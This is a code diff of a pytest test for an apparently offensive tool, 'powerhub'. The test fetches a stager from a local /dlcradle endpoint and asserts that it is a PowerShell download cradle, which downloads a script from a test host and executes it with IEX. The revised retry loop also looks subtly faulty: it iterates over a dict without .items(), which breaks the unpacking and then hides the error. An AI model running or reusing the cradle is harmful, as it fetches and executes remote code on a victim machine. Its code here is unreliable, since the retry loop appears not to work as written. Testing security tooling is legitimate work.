@@ -37,9 +37,18 @@ def get_stager():
             "RadioCertStore": "false",
         }
     }
-    r = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
-                     params=param_set['default'])
-    result += [r.text]
+    i = 0
+    while i < 10:
+        try:
+            for k, v in param_set:
+                result[k] = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
+                                         params=v).text
+            break
+        except Exception:
+            i += 1
+            time.sleep(.5)
+    result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace('"',
+                                                                    '\\"')
     return result
 
 
@@ -52,14 +61,13 @@ def full_app():
     from powerhub import powerhub
     from powerhub import reverseproxy
     powerhub.main(fully_threaded=True)
-    # Wait til app is ready
-    time.sleep(5)
     yield get_stager()
     reverseproxy.reactor.stop()
 
 
 def test_stager(full_app):
-    assert full_app[0] == ("$K=New-Object Net.WebClient;IEX "
-                           + f"$K.DownloadString('http://{TEST_URI}:8080"
-                           + "/0?t=http&f=h&a=reflection');"
-                           )
+    assert full_app['default'] == (
+        "$K=New-Object Net.WebClient;IEX "
+        + f"$K.DownloadString('http://{TEST_URI}:8080"
+        + "/0?t=http&f=h&a=reflection');"
+    )
